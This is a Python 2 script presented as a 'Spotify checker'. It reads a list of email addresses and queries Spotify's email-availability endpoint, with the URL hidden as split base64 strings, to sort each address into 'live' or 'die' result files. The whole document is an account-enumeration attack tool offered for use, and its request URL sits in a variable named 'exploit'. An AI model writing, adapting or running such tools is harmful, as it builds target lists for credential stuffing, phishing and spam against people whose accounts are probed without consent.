def main():
	import os
	from os import path as y
	import platform as p
	import datetime as dt
	import base64
	try:
	 	import requests as qs
	except ImportError:
		print("python -m pip install requests")
		sys.exit(1)
	import sys
	import time
	def mydate():
		year = dt.datetime.now().year
		month = dt.datetime.now().month
		day = dt.datetime.now().day
		print("\033[1;34;40m[SCAN] :"+str(year)+"/"+str(month)+"/"+str(day))	
	fi55 = "WlsYWJsZS5waHA/\nZW1haWw9"
	giv_p = p.system()
	if(giv_p == "Windows"):
		os.system("cls")
		color_green = "a"
		color_red = "c"
		os.system("color "+str(color_red))
	else:
		os.system("clear")
	print("\033[1;36;40m==================================================\033[0m")
	print("\033[1;33;40m[1] SPOTIFY CHECKER")
	print("[2] Bantuan\033[0m")
	print("\033[1;36;40m==================================================\033[0m")
	fi54 = "veGhyL2pzb24vaXNFbWFpbEF2Y"	
	def header():
		year = dt.datetime.now().year
		time_ = time.ctime()
		giv_p = p.system()
		print("\r\n")
		print("\033[0;34;47m===[                Zio-Alfino               ]===")
		print("===[            SPOTIFY CHECKER              ]===\033[0m\n")
		print(" \033[1;33;40mSystem\033[0m :\033[1;35;40m "+str(giv_p)+" & "+str(time_))
	def helps():
		print("Rssult : \033[1;32;40mLive\033[0m and \033[1;31;40mDie\033[0m Email")
	choiss = raw_input("\033[1;30;40m Select 1 OR 2 ? \033[0m")
	if (choiss == "1"):
		header()
		mydate()
		if(y.isdir("rzlt")):
			print("\033[1;33;40m[+] DIR Exist.\033[0m")
		else:
			os.mkdir("rzlt")
			print("\033[1;33;40m[+] File Created.\033[0m")	
		ask = raw_input("\033[1;33;40m[+] Mailist Aku Sayang [+]\033[0m : ")
		timeout = raw_input("\033[1;31;40m[ TIMEOUT ]\033[0m : ")
		fi53 = "aHR0cHM6Ly93d3cuc3BvdGlmeS5jb20vaWQ"
		mod_file = "r"
		mylist = open(ask,mod_file)
		read_me = mylist.readlines()
		xcount = len(read_me)
		if (xcount >= 1000000):
			msg = ", Login Check\n"
		else:
			msg = ", KANG COLI LU YA ? :V\n"	
		print("\033[1;34;40m[+] EMAIL\033[0m : "+str(len(read_me))+msg)
		for i in read_me:
			mailist = i.strip()
			decode_me = base64.decodestring(fi53+fi54+fi55)
			exploit = decode_me+str(mailist)
			get = qs.get(exploit,timeout=int(timeout))
			last_rzlt = get.content
			if (last_rzlt == "true"):
				print("[\033[1;34;40m "+str(mailist)+"\033[0m ] ===> [\033[1;31;40mDIE\033[0m]")
				save_invalid = open("rzlt/die.txt","a+")
				save_invalid.write("\n"+mailist)
			elif (last_rzlt == "false"):
				print("[\033[1;34;40m "+str(mailist)+"\033[0m ] ===> [\033[1;32;40mLIVE\033[0m]")
				save_valid = open("rzlt/live.txt","a+")
				save_valid.write("\n"+mailist)
			else:
				raw_input("Server Bermasalah Enter Untuk Kuluar => [ENTER]")
				print("Exiit ...")
				time.sleep(0)
				sys.exit(1)
	elif (choiss == "2"):
		header()
		helps()

	else:			
		sys.exit(1)	

if __name__ == '__main__':
		main() # MAIN FUNCTION [EXECUTE]